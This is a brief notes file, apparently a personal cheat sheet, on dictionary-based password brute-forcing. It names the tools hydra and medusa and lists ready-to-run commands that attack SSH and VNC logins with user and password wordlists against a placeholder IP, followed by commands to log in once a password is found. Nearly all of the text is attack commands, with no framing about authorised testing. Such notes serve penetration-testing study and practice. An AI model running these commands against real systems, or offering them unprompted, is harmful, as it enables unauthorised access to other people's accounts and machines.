#Dictionary based 
#bruteforce:

#tools
hydra
#to get graphical view:xtightvncviewer
medusa
#usage
sudo hydra -L <user.txt> -P <password.txt> ssh://<ip> -t4
sudo ssh username@<ip>
sudo hydra -P<list> vnc://<ip> -t4
sudo vncviewer <ip>
sudo medusa -h <ip> -U username.txt -P password.txt -M ssh
